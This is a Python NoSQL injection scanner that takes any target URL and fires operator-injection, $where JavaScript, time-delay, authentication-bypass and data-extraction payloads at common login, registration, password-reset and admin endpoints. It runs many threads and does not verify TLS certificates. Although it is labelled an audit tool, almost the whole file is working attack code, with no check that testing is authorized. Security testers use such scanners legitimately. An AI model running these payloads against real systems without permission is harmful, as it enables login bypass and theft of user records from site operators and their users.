#!/usr/bin/env python3

import requests
import json
import time
import threading
import itertools
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning
from typing import Dict, List, Tuple, Optional, Any
import warnings
import string
import random

warnings.filterwarnings('ignore', category=InsecureRequestWarning)

class NoSQLAuditor:
    def __init__(self, target_url: str, threads: int = 10, timeout: int = 30):
        self.target_url = target_url.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.vulnerabilities = []
        self.baseline_responses = {}
        
    def _generate_payloads(self) -> Dict[str, List[Dict[str, Any]]]:
        return {
            'operator_injection': [
                {'$gt': ''},
                {'$ne': None},
                {'$ne': ''},
                {'$exists': True},
                {'$regex': '.*'},
                {'$where': '1==1'},
                {'$or': [{'a': 1}, {'b': 2}]},
                {'$and': [{'a': {'$exists': True}}]},
                {'$nin': ['']},
                {'$in': ['admin', 'user', 'test']},
                {'$lt': 'z'},
                {'$lte': 'zzz'},
                {'$gte': ''},
                {'$eq': {'$ne': None}}
            ],
            'syntax_breaking': [
                "'", '"', '`', '\\', '$', '{', '}', ';', 
                '\x00', '%00', '\n', '\r', '\t'
            ],
            'boolean_bypass': [
                "' || '1'=='1",
                "' || true || '",
                "'; return true; //",
                "' + (1==1) + '",
                "admin'||'1'=='1';//",
                "' && this.password != '' && '1'=='1"
            ],
            'time_delay': [
                {'$where': 'sleep(5000) || true'},
                {'$where': 'if(1==1){sleep(3000);return true;}else{return true;}'},
                {'$where': 'this.username&&(function(){var d=new Date();do{var cd=new Date();}while(cd-d<3000);return true;})()'}
            ],
            'data_extraction': [
                {'$where': 'this.username.startsWith("a")'},
                {'$where': 'this.password.length > 5'},
                {'$where': 'this.email.includes("@admin")'},
                {'$regex': '^a.*'},
                {'$regex': '.*admin.*', '$options': 'i'}
            ]
        }

    def _send_request(self, endpoint: str, method: str = 'POST', 
                     data: Optional[Dict] = None, params: Optional[Dict] = None,
                     content_type: str = 'application/json') -> Optional[requests.Response]:
        try:
            url = f"{self.target_url}{endpoint}"
            headers = self.session.headers.copy()
            headers['Content-Type'] = content_type
            
            if method.upper() == 'GET':
                response = self.session.get(url, params=params, timeout=self.timeout)
            elif method.upper() == 'POST':
                if content_type == 'application/json':
                    response = self.session.post(url, json=data, params=params, timeout=self.timeout)
                else:
                    response = self.session.post(url, data=data, params=params, timeout=self.timeout, headers=headers)
            else:
                response = self.session.request(method, url, json=data, params=params, timeout=self.timeout)
                
            return response
        except Exception:
            return None

    def _establish_baseline(self, endpoint: str, normal_data: Dict) -> Dict:
        baseline = {}
        for content_type in ['application/json', 'application/x-www-form-urlencoded']:
            response = self._send_request(endpoint, data=normal_data, content_type=content_type)
            if response:
                baseline[content_type] = {
                    'status_code': response.status_code,
                    'content_length': len(response.content),
                    'response_time': response.elapsed.total_seconds(),
                    'headers': dict(response.headers)
                }
        return baseline

    def _detect_anomaly(self, response: requests.Response, baseline: Dict, 
                       content_type: str, expected_delay: float = 0) -> Tuple[bool, str]:
        if not response or content_type not in baseline:
            return False, "No baseline"
            
        base = baseline[content_type]
        anomalies = []
        
        if response.status_code != base['status_code']:
            anomalies.append(f"Status: {base['status_code']} -> {response.status_code}")
            
        length_diff = abs(len(response.content) - base['content_length'])
        if length_diff > 50:
            anomalies.append(f"Length: {base['content_length']} -> {len(response.content)}")
            
        time_diff = response.elapsed.total_seconds() - base['response_time']
        if expected_delay > 0 and time_diff >= (expected_delay * 0.8):
            anomalies.append(f"Time delay: +{time_diff:.2f}s (expected: {expected_delay}s)")
        elif expected_delay == 0 and time_diff > 2:
            anomalies.append(f"Unexpected delay: +{time_diff:.2f}s")
            
        return len(anomalies) > 0, "; ".join(anomalies)

    def _test_operator_injection(self, endpoint: str, param_name: str, 
                               baseline: Dict) -> List[Dict]:
        vulnerabilities = []
        payloads = self._generate_payloads()['operator_injection']
        
        for payload in payloads:
            for content_type in ['application/json', 'application/x-www-form-urlencoded']:
                test_data = {param_name: payload}
                
                if content_type == 'application/x-www-form-urlencoded':
                    if isinstance(payload, dict):
                        for key, value in payload.items():
                            test_data[f"{param_name}[{key}]"] = value
                        del test_data[param_name]
                
                response = self._send_request(endpoint, data=test_data, content_type=content_type)
                if response:
                    is_anomaly, details = self._detect_anomaly(response, baseline, content_type)
                    if is_anomaly:
                        vulnerabilities.append({
                            'type': 'Operator Injection',
                            'endpoint': endpoint,
                            'parameter': param_name,
                            'payload': payload,
                            'content_type': content_type,
                            'evidence': details,
                            'severity': 'High'
                        })
        
        return vulnerabilities

    def _test_syntax_breaking(self, endpoint: str, param_name: str, 
                            baseline: Dict) -> List[Dict]:
        vulnerabilities = []
        payloads = self._generate_payloads()['syntax_breaking']
        
        for payload in payloads:
            for content_type in ['application/json', 'application/x-www-form-urlencoded']:
                test_data = {param_name: payload}
                response = self._send_request(endpoint, data=test_data, content_type=content_type)
                
                if response:
                    is_anomaly, details = self._detect_anomaly(response, baseline, content_type)
                    if is_anomaly:
                        vulnerabilities.append({
                            'type': 'Syntax Breaking',
                            'endpoint': endpoint,
                            'parameter': param_name,
                            'payload': payload,
                            'content_type': content_type,
                            'evidence': details,
                            'severity': 'Medium'
                        })
        
        return vulnerabilities

    def _test_time_based_injection(self, endpoint: str, param_name: str, 
                                 baseline: Dict) -> List[Dict]:
        vulnerabilities = []
        payloads = self._generate_payloads()['time_delay']
        
        for payload in payloads:
            expected_delay = 3.0 if 'sleep(3000)' in str(payload) else 5.0
            
            for content_type in ['application/json', 'application/x-www-form-urlencoded']:
                test_data = {param_name: payload}
                
                if content_type == 'application/x-www-form-urlencoded' and isinstance(payload, dict):
                    if '$where' in payload:
                        test_data[f"{param_name}[$where]"] = payload['$where']
                        del test_data[param_name]
                
                start_time = time.time()
                response = self._send_request(endpoint, data=test_data, content_type=content_type)
                end_time = time.time()
                
                if response:
                    actual_delay = end_time - start_time
                    if actual_delay >= (expected_delay * 0.8):
                        vulnerabilities.append({
                            'type': 'Time-based Injection',
                            'endpoint': endpoint,
                            'parameter': param_name,
                            'payload': payload,
                            'content_type': content_type,
                            'evidence': f"Delay: {actual_delay:.2f}s (expected: {expected_delay}s)",
                            'severity': 'Critical'
                        })
        
        return vulnerabilities

    def _test_boolean_bypass(self, endpoint: str, param_name: str, 
                           baseline: Dict) -> List[Dict]:
        vulnerabilities = []
        payloads = self._generate_payloads()['boolean_bypass']
        
        for payload in payloads:
            for content_type in ['application/json', 'application/x-www-form-urlencoded']:
                test_data = {param_name: payload}
                response = self._send_request(endpoint, data=test_data, content_type=content_type)
                
                if response:
                    is_anomaly, details = self._detect_anomaly(response, baseline, content_type)
                    if is_anomaly and (response.status_code == 200 or 'success' in response.text.lower()):
                        vulnerabilities.append({
                            'type': 'Boolean Bypass',
                            'endpoint': endpoint,
                            'parameter': param_name,
                            'payload': payload,
                            'content_type': content_type,
                            'evidence': details,
                            'severity': 'High'
                        })
        
        return vulnerabilities

    def _test_data_extraction(self, endpoint: str, param_name: str, 
                            baseline: Dict) -> List[Dict]:
        vulnerabilities = []
        payloads = self._generate_payloads()['data_extraction']
        
        for payload in payloads:
            for content_type in ['application/json', 'application/x-www-form-urlencoded']:
                test_data = {param_name: payload}
                
                if content_type == 'application/x-www-form-urlencoded' and isinstance(payload, dict):
                    for key, value in payload.items():
                        test_data[f"{param_name}[{key}]"] = value
                    del test_data[param_name]
                
                response = self._send_request(endpoint, data=test_data, content_type=content_type)
                
                if response:
                    is_anomaly, details = self._detect_anomaly(response, baseline, content_type)
                    if is_anomaly:
                        vulnerabilities.append({
                            'type': 'Data Extraction',
                            'endpoint': endpoint,
                            'parameter': param_name,
                            'payload': payload,
                            'content_type': content_type,
                            'evidence': details,
                            'severity': 'Medium'
                        })
        
        return vulnerabilities

    def _test_second_order_injection(self, endpoint: str, params: List[str]) -> List[Dict]:
        vulnerabilities = []
        
        injection_payloads = [
            "{'$ne': null}",
            "{'$where': 'this.admin==true'}",
            "admin'||'1'=='1';//"
        ]
        
        for payload in injection_payloads:
            for param in params:
                test_data = {param: payload, 'action': 'store'}
                
                store_response = self._send_request(endpoint, data=test_data)
                if store_response and store_response.status_code == 200:
                    
                    time.sleep(1)
                    
                    retrieve_data = {'action': 'retrieve', 'id': payload[:10]}
                    retrieve_response = self._send_request(endpoint, data=retrieve_data)
                    
                    if retrieve_response and ('error' in retrieve_response.text.lower() or 
                                            retrieve_response.status_code == 500):
                        vulnerabilities.append({
                            'type': 'Second-order Injection',
                            'endpoint': endpoint,
                            'parameter': param,
                            'payload': payload,
                            'content_type': 'application/json',
                            'evidence': f"Storage successful, retrieval caused error: {retrieve_response.status_code}",
                            'severity': 'High'
                        })
        
        return vulnerabilities

    def audit_endpoint(self, endpoint: str, parameters: List[str]) -> List[Dict]:
        endpoint_vulnerabilities = []
        
        normal_data = {param: f"test_value_{i}" for i, param in enumerate(parameters)}
        baseline = self._establish_baseline(endpoint, normal_data)
        
        if not baseline:
            return endpoint_vulnerabilities
        
        test_methods = [
            self._test_operator_injection,
            self._test_syntax_breaking,
            self._test_time_based_injection,
            self._test_boolean_bypass,
            self._test_data_extraction
        ]
        
        for param in parameters:
            for test_method in test_methods:
                try:
                    vulns = test_method(endpoint, param, baseline)
                    endpoint_vulnerabilities.extend(vulns)
                except Exception:
                    continue
        
        second_order_vulns = self._test_second_order_injection(endpoint, parameters)
        endpoint_vulnerabilities.extend(second_order_vulns)
        
        return endpoint_vulnerabilities

    def run_audit(self, endpoints_config: Dict[str, List[str]]) -> Dict:
        all_vulnerabilities = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_endpoint = {
                executor.submit(self.audit_endpoint, endpoint, params): endpoint
                for endpoint, params in endpoints_config.items()
            }
            
            for future in as_completed(future_to_endpoint):
                endpoint = future_to_endpoint[future]
                try:
                    vulnerabilities = future.result()
                    all_vulnerabilities.extend(vulnerabilities)
                except Exception:
                    continue
        
        severity_counts = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
        for vuln in all_vulnerabilities:
            severity_counts[vuln.get('severity', 'Low')] += 1
        
        return {
            'total_vulnerabilities': len(all_vulnerabilities),
            'severity_breakdown': severity_counts,
            'vulnerabilities': all_vulnerabilities,
            'scan_summary': {
                'target': self.target_url,
                'endpoints_tested': len(endpoints_config),
                'parameters_tested': sum(len(params) for params in endpoints_config.values())
            }
        }

def main():
    target_url = input("Enter target URL: ").strip()
    
    common_endpoints = {
        '/api/auth/login': ['email', 'password', 'username'],
        '/api/auth/register': ['email', 'password', 'name', 'username'],
        '/api/auth/reset-password': ['email', 'token', 'newPassword'],
        '/api/user/profile': ['id', 'username', 'email'],
        '/api/search': ['query', 'filter', 'category'],
        '/api/admin/users': ['id', 'role', 'status'],
        '/login': ['username', 'password'],
        '/register': ['email', 'password', 'confirm_password'],
        '/search': ['q', 'type', 'category'],
        '/contact': ['name', 'email', 'message'],
        '/newsletter/unsubscribe': ['email', 'token']
    }
    
    custom_input = input("Use custom endpoints? (y/N): ").strip().lower()
    if custom_input == 'y':
        endpoints_config = {}
        while True:
            endpoint = input("Enter endpoint (or 'done' to finish): ").strip()
            if endpoint.lower() == 'done':
                break
            if endpoint:
                params = input(f"Enter parameters for {endpoint} (comma-separated): ").strip()
                if params:
                    endpoints_config[endpoint] = [p.strip() for p in params.split(',')]
    else:
        endpoints_config = common_endpoints
    
    auditor = NoSQLAuditor(target_url, threads=5, timeout=10)
    
    print(f"\nStarting NoSQL injection audit on {target_url}")
    print(f"Testing {len(endpoints_config)} endpoints...")
    
    results = auditor.run_audit(endpoints_config)
    
    print(f"\n{'='*60}")
    print("NOSQL INJECTION AUDIT RESULTS")
    print(f"{'='*60}")
    print(f"Target: {results['scan_summary']['target']}")
    print(f"Endpoints tested: {results['scan_summary']['endpoints_tested']}")
    print(f"Parameters tested: {results['scan_summary']['parameters_tested']}")
    print(f"Total vulnerabilities found: {results['total_vulnerabilities']}")
    print("\nSeverity breakdown:")
    for severity, count in results['severity_breakdown'].items():
        if count > 0:
            print(f"  {severity}: {count}")
    
    if results['vulnerabilities']:
        print(f"\n{'='*60}")
        print("DETAILED VULNERABILITY REPORT")
        print(f"{'='*60}")
        
        for i, vuln in enumerate(results['vulnerabilities'], 1):
            print(f"\n[{i}] {vuln['type']} - {vuln['severity']}")
            print(f"    Endpoint: {vuln['endpoint']}")
            print(f"    Parameter: {vuln['parameter']}")
            print(f"    Content-Type: {vuln['content_type']}")
            print(f"    Payload: {vuln['payload']}")
            print(f"    Evidence: {vuln['evidence']}")
    else:
        print("\nNo NoSQL injection vulnerabilities detected.")
    
    output_file = f"nosql_audit_{int(time.time())}.json"
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2, default=str)
    print(f"\nDetailed results saved to: {output_file}")

if __name__ == "__main__":
    main()
